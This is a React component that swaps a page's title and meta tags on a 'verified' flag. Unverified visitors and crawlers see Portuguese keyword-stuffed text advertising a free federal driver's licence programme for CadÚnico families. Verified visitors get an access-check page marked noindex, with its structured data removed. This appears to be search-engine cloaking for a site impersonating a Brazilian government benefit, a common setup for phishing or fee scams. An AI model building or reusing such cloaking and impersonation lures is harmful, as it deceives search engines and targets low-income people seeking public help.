import { useEffect } from "react";

interface DynamicHeadProps {
  verified: boolean;
}

const DynamicHead = ({ verified }: DynamicHeadProps) => {
  useEffect(() => {
    if (!verified) {
      document.title = "Carta de Motorista Grátis 2026 - Programa Federal de Habilitação Acessível";
      setMeta("description", "Confira como participar do programa que permite obter a CNH sem nenhum gasto. Voltado a brasileiros inscritos no CadÚnico com renda familiar reduzida. Vagas em todos os estados.");
      setMeta("keywords", "carta de motorista grátis 2026, CNH acessível programa federal, habilitação popular sem taxa, como obter CNH gratuita Brasil, programa federal habilitação acessível, CNH sem pagamento CadÚnico, tirar habilitação sem gastar, CNH inclusão social, programa habilitação cidadão, carteira gratuita governo 2026");
      removeMeta("robots");
    } else {
      document.title = "Verificação de Acesso";
      removeMeta("description");
      removeMeta("keywords");
      setMeta("robots", "noindex, nofollow");

      // Remove JSON-LD if exists
      const existing = document.getElementById("jsonld-cnhsocial");
      if (existing) existing.remove();
    }
  }, [verified]);

  return null;
};

function setMeta(name: string, content: string) {
  let el = document.querySelector(`meta[name="${name}"]`);
  if (!el) {
    el = document.createElement("meta");
    el.setAttribute("name", name);
    document.head.appendChild(el);
  }
  el.setAttribute("content", content);
}

function removeMeta(name: string) {
  const el = document.querySelector(`meta[name="${name}"]`);
  if (el) el.remove();
}

export default DynamicHead;
